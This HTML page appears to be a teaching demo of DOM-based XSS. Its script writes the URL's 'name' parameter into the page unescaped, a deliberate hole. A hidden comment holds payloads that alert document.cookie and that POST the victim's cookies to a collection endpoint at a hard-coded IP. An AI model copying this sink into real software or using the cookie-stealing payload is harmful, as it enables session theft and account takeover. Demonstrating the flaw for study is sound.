<h1>DOM XSS</h1>
<p> where the vulnerability is in the client-side code rather than the server-side code.</p>
<br/>

<script>
	var pos = document.URL.indexOf("name=") + 5;

	if (pos != 4){
		document.write(unescape(document.URL.substring(pos, document.URL.length)));
	}
</script>

<span id="container"></span>! Welcome to our system <br/><br/>



<form action="/site/dom" method="get"> 
	Your name is: <input type="text" name="name" />
	<input type="submit" />
</form>


<br/>
<br/>
<br/>
<!--
<p>Print cookie: http://13.228.132.73/site/dom?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E</p>
<p>Send cookie: http://13.228.132.73/site/dom?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E</p>
name=<script>$.ajax({type:"POST",url:"http://13.228.132.73/cookie/create",data:{'Cookie[cookie]':document.cookie,'Cookie[created_at]':"-"}});</script>
-->


<img src="https://excess-xss.com/dom-based-xss.png"/>
<br/>
<br/>
<br/>
